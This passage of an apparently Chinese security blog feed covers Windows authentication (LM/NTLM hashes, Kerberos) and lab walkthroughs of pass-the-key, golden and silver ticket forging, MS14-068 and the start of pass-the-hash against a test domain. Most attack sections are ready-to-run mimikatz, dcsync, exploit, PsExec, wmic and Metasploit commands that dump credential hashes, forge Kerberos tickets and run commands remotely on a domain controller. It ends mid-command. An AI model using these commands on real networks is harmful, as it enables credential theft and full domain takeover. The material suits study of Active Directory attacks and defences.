title="本地登录认证"></a>本地登录认证</h1><p>登录windows时，winlogon.exe会将用户输入的账号和密码发送给lsass.exe，lsass.exe会读取sam数据库文件中保存的hash（Windows本身不保存明文密码），与之前输入密码计算得到的NTLM hash进行比对，如果相同，证明认证成功。</p><p>大概流程：winlogon.exe–&gt;用户输入–&gt;lsass.exe–&gt;认证</p><p>hash结构通常为：username:SID:LM hash:NT hash</p><h2 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a>LM hash</h2><p>古老算法，密码明文限制在14位内。比较容易被破解，server 2008及以后系统默认关闭。</p><p>流程：</p><ol><li>换大写（数字不变）。</li><li>转化为16进制。</li><li>用0补齐14位。</li><li>分两半，每组7bit</li><li>转换为2进制，每7bit一组末尾加0，转换为16进制。</li><li>2组8字节数据作为DESKEY，加密固定字符串KGS!@#$%（16进制为4B47532140232425）。</li><li>密文拼接共16字节。</li></ol><p>当LM被禁用或口令为空时，抓取的LM-hash通常为：aad3b435b51404eeaad3b435b51404ee或者null。</p><p>存在问题：</p><ol><li>口令不区分大小写。</li><li>口令长度最大为14字节，另外如果口令长度不超过7字节，则LM hash的后8字节是固定值AA-D3-B4-35-B5-14-04-EE。</li><li>DES算法强度不够。</li></ol><h2 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h2><p>通常保存在%SystemRoot%\system32\config\sam文件或域控账号数据库%SystemRoot%\NTDS\ntds.dit中，可以直接用来pth攻击。</p><p>基于MD4加密算法，提高了安全性，从server2003开始windows认证方式均为NTLM hash。</p><p>大概流程：hex–&gt;unicode–&gt;md4</p><p>NT Hash &#x3D; MD4(UTF-16-LE(password))     也称为NTLM hash。</p><p>NTLM Hash &#x3D; LM Hash + NT Hash   </p><p>优势：</p><ol><li>明文口令大小写敏感。</li><li>无法判断明文口令位数。</li><li>单向加密。</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://www.cnblogs.com/-qing-/p/11343859.html">https://www.cnblogs.com/-qing-/p/11343859.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hash </tag>
            
            <tag> NTLM </tag>
            
            <tag> LSASS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows认证之Kerberos协议</title>
      <link href="/2021/02/05/4ecc97d5.html"/>
      <url>/2021/02/05/4ecc97d5.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li><p><strong>Kerberos协议</strong></p><p>一种域用户身份认证协议。在Client访问Server上的服务之前，需要先获取认证票据，才有资格获得访问server的入场券，这一系列过程由Kerberos协议提供。Kerberos认证体现的核心是票据，依赖于KDC密钥（krbtgt密码hash），若得到krbtgt密码hash，就可以访问域中以kerberos协议认证的服务，产生票据传递攻击。票据传递攻击的方式包含黄金票据、白银票据、MS14-068等。</p></li><li><p><strong>KDC</strong></p><p>密钥分发中心，默认安装在DC中，根据功能划分，KDC包含2大模块：AS、TGS。</p><p>KDC服务框架中包含一个krbtgt账户（该账号不自动更新），是创建域时系统自动创建的一个无法登录的账号，在发放票据时会使用到它的密码hash值。</p></li><li><p><strong>AS</strong></p><p>用于验证用户身份，验证通过后发布认证票据，认证票据可以多次循环使用。</p></li><li><p><strong>TGS</strong></p><p>票据授予服务，根据认证票据，发放授权票据。</p></li><li><p><strong>TGT</strong></p><p>认证票据。</p></li><li><p><strong>ST</strong></p><p>授权票据。</p></li><li><p><strong>票据</strong></p><p>网络对象互相访问的凭证。</p></li><li><p><strong>PAC</strong></p><p>特权属性证书。Kerberos协议执行过程中不只需要证明Client是否是他人冒充的，还需声明Client是否有访问Server的权限。为此引入PAC概念。</p></li></ul><h1 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a><strong>认证流程</strong></h1><h2 id="申请认证票据"><a href="#申请认证票据" class="headerlink" title="申请认证票据"></a>申请认证票据</h2><ul><li><strong>Client -&gt; AS</strong>：Client向AS发送认证1（通过Client的密码hash加密的自身信息：TimeStamp、ClientID、网络地址、加密类型等内容）。</li><li><strong>AS -&gt; Client</strong>：AS根据KDC中存储的用户密码hash来解密认证1验证信息，验证通过后返回给Client由Client密码hash加密的Sessionkey-as和TGT（由krbtgt hash加密的Sessionkey-as和Client信息）。ps：Sessionkey是一个基于用户密码hash派生出来的key。</li></ul><h2 id="申请授权票据"><a href="#申请授权票据" class="headerlink" title="申请授权票据"></a><strong>申请授权票据</strong></h2><ul><li><strong>Client -&gt;TGS</strong>： Client解密得到Sessionkey-as，然后将认证2（Sessionkey-as加密的Client信息）和TGT一起发送给TGS，换取能够访问Server票据ST。</li><li><strong>TGS -&gt; Client</strong>：TGS检查是否存在Client所请求的服务，若服务存在，则解密TGT获得Sessionkey-as和Client信息，再用Sessionkey-as解密认证2，对比两次解密后得到的Client信息。验证成功后将Sessionkey-as加密的Sessionkey-tgs和ST（Server密码hash加密的Sessionkey-tgs和Client信息，目的也是为了让Client携带而已）发送给Client。</li></ul><h2 id="使用授权票据"><a href="#使用授权票据" class="headerlink" title="使用授权票据"></a>使用授权票据</h2><ul><li><strong>Client -&gt; Server</strong>：Client解密得到Sessionkey-tgs，然后发送认证3（Sessionkey-tgs加密的Client信息）和ST给Server。</li><li><strong>Server-&gt; Client</strong>：Server解密ST得到Sessionkey-tgs和Client信息，再用Sessionkey-tgs解密认证3得到Client信息，和ST中的Client信息做对比，验证成功则证明Client拥有正确的Sessionkey-tgs，随后Server向Client返回数据，里面包含了Sessionkey-tgs加密的Client信息，此时Client再使用Sessionkey-tgs解密并提取Client信息，确认和自己之前发送的Client信息一致，此时双向认证建立。</li></ul><h2 id="PAC实现"><a href="#PAC实现" class="headerlink" title="PAC实现"></a><strong>PAC实现</strong></h2><p>存在于步骤2345。</p><p>在PAC中包含有两个数字签名PAC_SERVER_CHECKSUM（第2步中由krbtgt密码hash加密，第4步中由Server密码hash加密）和PAC_PRIVSVR_CHECKSUM（第2步中由krbtgt密码hash加密，第4步中由Sessionkey-tgs加密），PAC被AS放在TGT里加密发送给Client，Client转发给TGS来验证，TGS解密之后验证签名是否正确，验证成功后重新构造新的PAC放在ST里返回给Client，Client将ST发送给server进行验证，Server收到ST之后解密得到PAC，为了判断用户是否具有合法权限将PAC的数字签名以及一些Client信息发送给KDC，KDC通过PAC指定的user和group的SID以及其他一些信息判断用户的用户组信息，用户权限等，然后将结果以RPC返回码的形式返回给Server，Server将此信息与用户申请服务的ACL比较，最后决定是否给用户提供相应的服务。                                                                                                                                                                                                                                                                                                                                                                                                                                                                              </p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://blog.csdn.net/prettyX/article/details/103944130">https://blog.csdn.net/prettyX/article/details/103944130</a></p><p><a href="https://www.freebuf.com/articles/system/196434.html">https://www.freebuf.com/articles/system/196434.html</a></p><p><a href="https://www.freebuf.com/vuls/56081.html">https://www.freebuf.com/vuls/56081.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 票据 </tag>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pass The Key</title>
      <link href="/2021/02/05/7493558d.html"/>
      <url>/2021/02/05/7493558d.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>ptk，密钥传递攻击，与pth类似，获取用户的aes hmac，在NTLM认证被禁止的情况下访问远程主机服务，AES-256或AES-128密钥均可。</p><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h1><ul><li>拿下一台域成员主机并且得到域管用户的aes hash，且该用户在另一台域成员主机上的管理员组中。</li><li>拿下主机为win7、win8、server 2008r2、server 2012系统，且安装了补丁KB2871997。</li><li>拿下主机为win 8.1、server 2012r2系统不需要安装KB2871997。</li></ul><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a><strong>复现</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; </span><br><span class="line">sekurlsa::pth /user:testuser /domain:holy.testA /aes256:8f581e3a73d0f06f176752305f081c1cee1c8efc6a73945c37fba3c96befc830</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210205102356.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210205102601.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.tiejiang.org/23508.html">https://www.tiejiang.org/23508.html</a><br><a href="https://www.cnblogs.com/zpchcbd/p/12215936.html">https://www.cnblogs.com/zpchcbd/p/12215936.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 票据 </tag>
            
            <tag> Kerberos </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pass The Ticket</title>
      <link href="/2021/02/05/bbd2dee8.html"/>
      <url>/2021/02/05/bbd2dee8.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>ptt</strong></p><p>票据传递攻击，利用Kerberos协议进行攻击。</p><p>常见攻击方法：</p><ul><li>黄金票据（Golden Ticket）</li><li>白银票据（Silver Ticket）</li><li>MS16-068</li></ul><h1 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a><strong>Golden Ticket</strong></h1><ul><li>第一次AS认证成功后给client返回TGT，通过<strong>伪造TGT</strong>跳过AS认证，直接进行第二次认证，从而和任意server进行通信，可以在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限，且不会记录事件日志。</li><li>生成伪造TGT的20分钟内，TGS不会对该TGT的真伪进行校验。</li><li>因为krbtgt只有域控制器上面才有，所以黄金凭据可以理解为一个后门。</li><li>有了金票据，免除了AS验证username、password的阶段，所以也不担心域管密码修改，除非用户krbtgt的密码被改了，否则krbtgt NTLM hash绝不会改变。</li></ul><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h2><ol><li>域名称、域SID。</li><li>域krbtgt账户的ntlm hash或aes-256。</li><li>伪造的用户名，可以是任意用户（即使不存在），通常是administrator。</li></ol><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a><strong>复现</strong></h2><p>前期准备。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:krbtgt /domain:holy.testA    获取krbtgt的hash </span><br><span class="line">wmic useraccount get name,sid     获取域SID </span><br><span class="line">whoami /user         查看当前用户SID </span><br><span class="line">net user xxx /doman        查看当前用户详细信息 </span><br><span class="line">net group &quot;domain admins&quot; /domain    查看域管理员账号 </span><br><span class="line">ipconfig /all    查询域名</span><br></pre></td></tr></table></figure><p>先使用命令将登录生成的票据清空，防止影响。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge </span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><p>在磁盘中生成黄金票据并使用。ps：不需要指定服务名，因为拿到TGT就可以请求任何服务的权限，只要目标服务支持Kerberos认证，且有权限访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:holy.testA /sid:S-1-5-21-2288155968-3585056588-2606465096 /krbtgt:985293xxxxxxxxxxxxxxxxxx59eb12 /ticket:administrator.ticket.bin </span><br><span class="line">kerberos::ptt administrator.ticket.bin</span><br></pre></td></tr></table></figure><p>或者使用&#x2F;ptt，票据将生成于内存而不是磁盘。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:holy.testA /sid:S-1-5-21-2288155968-3585056588-2606465096 /krbtgt:985293xxxxxxxxxxxxxxxxx459eb12 /ticket:administrator.ticket.bin /ptt</span><br></pre></td></tr></table></figure><p>或者使用krbtgt的aes256值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:holy.testA /sid:S-1-5-21-2288155968-3585056588-2606465096 /aes256:75472501fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxd862949c /ticket:administrator.ticket.bin /ptt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204200724.png"></p><p>查看票据。::tgt也行。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204200814.png"></p><p>此时票据已注入内存，升为域管权限（重启后失效），可通过DRSR协议，从DC中获取用户hash。ps：本地管理员用户登录域成员服务器，无法使用dcsync功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:holy.testA /all /csv</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204201026.png"></p><p>可成功访问域控文件共享服务。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204204250.png"></p><p>此时查看内存中的缓存票据，也有了对dc.holy.testA的cifs票据，证明每次进行操作都会使用伪造的TGT去生成相应的新的票据。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204204425.png"></p><p>还可以wmic远程执行命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /authority:&quot;kerberos:HOLY\DC&quot; /node:&quot;DC&quot; process call create &quot;calc&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204211821.png"></p><p>回到DC上查看，进程已开启。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204211839.png"></p><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a><strong>防护</strong></h2><ul><li>只有经常更新krbtgt用户的密码，才能使原有的票据失效。</li><li>提升服务器版本08-&gt;12或者自行修改。</li></ul><h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a><strong>局限性</strong></h2><p>以上测试均是在根域中，创建的Golden Ticket域包含Enterprise Admins组。在多域林中，如果创建的Golden Ticket域不包含Enterprise Admins组，也就是说若不在根域中创建，Golden Ticket不会向林中的其他域提供管理权限。</p><h1 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h1><ul><li>TGS在第二次认证成功后给Client返回ST，通过<strong>伪造ST</strong>，跳过Client和KDC的前两次认证过程，直接与Server进行认证，没有与DC通信，没有TGT去不断申请ticket，一次只能访问目标机器中指定的服务，目标服务器上会记录事件日志。</li><li>由于ST是Server NTLM-hash对Sessionkey-tgs、timestamp、Client-info加密的结果，所以只要获取Server NTLM-hash的情况下便可以对ST进行伪造；Server并没有存储Sessionkey-tgs，因此可以随意伪造Sessionkey-tgs。还是后门作用。</li></ul><h2 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h2><ol><li>域名称FQDN、域SID</li><li>可利用的服务</li><li>域中Server服务器账户的NTLM-Hash</li><li>伪造的用户名（可以是任意的）</li></ol><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a><strong>复现</strong></h2><p>前期准备。ps：恢复快照机器账户hash会一直改变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords    获取服务hash </span><br><span class="line">wmic useraccount get name,sid     获取域SID </span><br><span class="line">whoami /user         查看当前用户SID </span><br><span class="line">net user xxx /domain        查看当前用户详细信息 </span><br><span class="line">net group &quot;domain admins&quot; /domain    查看域管理员账号 </span><br><span class="line">ipconfig /all    查询域名</span><br></pre></td></tr></table></figure><p>能利用的服务列表。</p><table><thead><tr><th align="center">Service Typ</th><th align="center">Service Silver Tickets</th></tr></thead><tbody><tr><td align="center">WMI</td><td align="center">HOST、RPCSS</td></tr><tr><td align="center">PowerShell Remoting</td><td align="center">HTTP、HOST、（WSMAN、RPCSS）</td></tr><tr><td align="center">WinRM</td><td align="center">HOST、HTTP</td></tr><tr><td align="center">Scheduled Tasks</td><td align="center">HOST</td></tr><tr><td align="center">Windows File Share</td><td align="center">CIFS</td></tr><tr><td align="center">LDAP、DCSync（Mimikatz ）</td><td align="center">LDAP</td></tr><tr><td align="center">Windows Remote Server Administration Tools</td><td align="center">RPCSS、LDAP、CIFS</td></tr></tbody></table><p><strong>常用命令</strong></p><ul><li>&#x2F;domain：完整的域名称，如：lab.adsecurity.org。 </li><li>&#x2F;sid：域的SID，如：S-1-5-21-1473643419-774954089-2222329127。 </li><li>&#x2F;user：域用户名 &#x2F;groups（可选）：用户所属的组RID。 </li><li>&#x2F;ticket（可选）：提供一个路径和名称，用于保存Golden Ticket文件以便日后使用，或者使用&#x2F;ptt立即将黄金票据插入到内存中以供使用。</li><li>&#x2F;ptt - 作为&#x2F; ticket的替代品，使用它来立即将伪造的票据插入到内存中以供使用。 </li><li>&#x2F;id（可选）：用户RID，Mimikatz默认值是500（默认管理员帐户RID）。 </li><li>&#x2F;startoffset（可选）：票证可用时的起始偏移（如果使用此选项，通常设置为-10或0）Mimikatz默认值是0。 </li><li>&#x2F;endin（可选）：票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为10小时。</li><li>&#x2F;renewmax（可选）：续订最长票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为最长为7天。</li></ul><p><strong>cifs：共享服务</strong></p><p>生成票据写入内存，因为cifs服务挂在机器账号下，因此获取机器账户hash即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge kerberos::list kerberos::golden /domain:holy.testA /sid:S-1-5-21-2288155968-3585056588-2606465096 /target:DC.holy.testA /service:cifs /rc4:b19xxxxxxxxxxxxxxxxec6bc5 /user:anything /ptt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204220520.png"></p><p>随后即可访问到域控共享服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.holy.testA\c$</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204220717.png"></p><p><strong>HOST：修改和创建计划任务</strong></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204221247.png"></p><p>创建计划任务，可能会被拦截。（若是任务名存在，则会用新创建的任务内容代替）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /S DC.holy.testA /sc WEEKLY /TN &quot;test&quot; /TR &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><p>查看是否添加成功，报错是由于本地cmd编码不对。936是GBK编码，换成437美国编码后再查看即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /S DC.holy.testA</span><br><span class="line">chcp 437</span><br></pre></td></tr></table></figure><p>已创建成功。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204221525.png"></p><p>在目标机器上验证。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204221542.png"></p><p><strong>LDAP：获得LDAP管理权限</strong></p><p>ps：只读域控制器默认不允许读取用户密码数据。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204221647.png"></p><p><strong>HTTP、WSMAN服务：WinRM或PowerShell远程执行命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:holy.testA /sid:S-1-5-21-2288155968-3585056588-2606465096 /target:DC.holy.testA /service:http /rc4:6a393d69096f6128a204b8f507c7e454 /user:anything /ptt </span><br><span class="line">kerberos::golden /domain:holy.testA /sid:S-1-5-21-2288155968-3585056588-2606465096 /target:DC.holy.testA /service:wsman /rc4:6a393d69096f6128a204b8f507c7e454 /user:anything /ptt</span><br><span class="line">New-PSSession -Name test -ComputerName DC; Enter-PSSession -Name test</span><br></pre></td></tr></table></figure><p><strong>HOST、 RPCSS服务：WMI RCE</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:holy.testA /sid:S-1-5-21-2288155968-3585056588-2606465096 /target:DC.holy.testA /service:host /rc4:6a393d69096f6128a204b8f507c7e454 /user:anything /ptt </span><br><span class="line">kerberos::golden /domain:holy.testA /sid:S-1-5-21-2288155968-3585056588-2606465096 /target:DC.holy.testA /service:RPCSS /rc4:6a393d69096f6128a204b8f507c7e454 /user:anything /ptt</span><br></pre></td></tr></table></figure><p>调用Invoke-WmiMethod在目标系统上运行命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WmiMethod win32_process -ComputerName DC -name create -argumentlist &quot;cmd /c md c:\test&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204222647.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204222657.png"></p><p>wmic。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /authority:\&quot;kerberos:HOLY\\DC\&quot; /node:\&quot;DC\&quot; process call create \&quot;cmd /c md c:\\123\&quot;</span><br></pre></td></tr></table></figure><p><strong>参考</strong></p><p><a href="https://www.freebuf.com/column/231892.html">https://www.freebuf.com/column/231892.html</a></p><p><a href="https://blog.csdn.net/cj_Allen/java/article/details/104310265">https://blog.csdn.net/cj_Allen/java/article/details/104310265</a></p><p><a href="https://blog.csdn.net/qq_18501087/java/article/details/102829000">https://blog.csdn.net/qq_18501087/java/article/details/102829000</a></p><p><a href="https://www.cnblogs.com/backlion/p/8119013.html">https://www.cnblogs.com/backlion/p/8119013.html</a></p><h2 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a><strong>防护</strong></h2><p>杀毒软件、改密码。</p><h1 id="金票和银票的区别"><a href="#金票和银票的区别" class="headerlink" title="金票和银票的区别"></a><strong>金票和银票的区别</strong></h1><ol><li><p>银票参数比金票多，&#x2F;target：指定获取权限的机器。&#x2F;rc4：对应的抓取指定机器的服务hash。 &#x2F;server：需要获取的服务。</p></li><li><p>金票前提是抓取域ktbtgt账号hash，银票前提是服务hash。</p></li><li><p>金票使用过程中需要与DC通信，银票不用。</p></li><li><p>金票伪造的TGT，针对所有机器的所有服务，银票伪造的ST，一次只能访问指定的机器中指定的服务。</p></li></ol><h1 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a><strong>MS14-068</strong></h1><p>KDC服务中的漏洞。允许经过身份验证的用户在其TGT中插入任意PAC。如果服务器没有向DC验证pac的话，那么客户端可以伪造域管的权限来访问服务器。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h2><p>Windows Server 2003、Vista、Server 2008、Server 2008 R2、win8、Win 8.1、Server 2012、Server 2012 R2</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a><strong>危害</strong></h2><p>允许域内任何一个普通用户，将自己提升至域管权限，微软给出的补丁是kb3011780。</p><h2 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h2><ol><li>域控没有打补丁。</li><li>注入票据时，机器不能是03或xp，因为mimikatz不支持这两个机器注入。</li><li>拿到域用户、密码、域用户sid以及可访问到DC的机器。ps：并不需要机器一定在域中，可通过vpn等拨入内网，但需要把dns指向域控制器才能解析。</li></ol><h2 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a><strong>复现</strong></h2><p>前期准备。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /user     查看当前用户SID </span><br><span class="line">ipconfig /all    查询域名</span><br></pre></td></tr></table></figure><p>使用exp生成一张高权限的TGT。两种方法均可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u testuser2\@holy.testA -p qwe123@ -s S-1-5-21-2288155968-3585056588-2606465096-1109 -d DC.holy.testA</span><br><span class="line">python ms14-068.py -u testuser2\@holy.testA -s S-1-5-21-2288155968-3585056588-2606465096-1109 -d 172.16.1.6 -p qwe123@</span><br></pre></td></tr></table></figure><p>若域机器是可以和域控制器互通则会创建.ccache文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210205094001.png"></p><p>清除已有的kerberos票据后将票据注入到内存中。这里mimikatz不需要管理员权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge </span><br><span class="line">kerberos::list </span><br><span class="line">kerberos::ptc TGT_testuser2\@holy.testA.ccache</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210205094131.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210205094158.png"></p><p>复现失败。。。可能域控win2012新版本有集成的补丁，漏洞不存在了，有空再换成server 2008当域控测一下。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210205094246.png"></p><p>若攻击成功可进行下一步操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC.holy.testA\C$     访问文件 </span><br><span class="line">PsExec.exe /accepteula \\DC.holy.testA -s cmd.exe    远程执行命令 </span><br><span class="line">sekurlsa::tickets /export     导出票据</span><br><span class="line">等等。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 票据 </tag>
            
            <tag> Kerberos </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pass The Hash</title>
      <link href="/2021/02/04/ed458597.html"/>
      <url>/2021/02/04/ed458597.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h2><p>hash传递攻击，可以直接通过LM hash或NTLM hash访问远程主机服务，如smb、wmi、rpc、rdp等，不用提供明文密码。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>目标主机未打补丁KB2871997。</li><li>拿下一台域成员主机并且得到域管用户的NTLM hash，且该用户在另一台域成员主机上的管理员组中。</li></ol><h2 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a><strong>KB2871997</strong></h2><p>无法使用本地管理员权限利用psexec、smbexec、schtasks等工具访问远程主机，同时也无法访问远程主机文件共享服务。ps：拿SID为500的账号进行pth就不会受到该补丁影响，默认为administrator，即使改名。</p><p>修改注册表，默认设置为0，如果设置为1，即使SID为500的管理员也不能通过网络登录的方式获取高权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\FilterAdministratorToken</span><br></pre></td></tr></table></figure><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a><strong>利用方式</strong></h1><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a><strong>msf</strong></h2><p><strong>PsExec</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec </span><br><span class="line">set rhosts 172.16.1.6 </span><br><span class="line">set smbuser testuser </span><br><span class="line">set smbpass 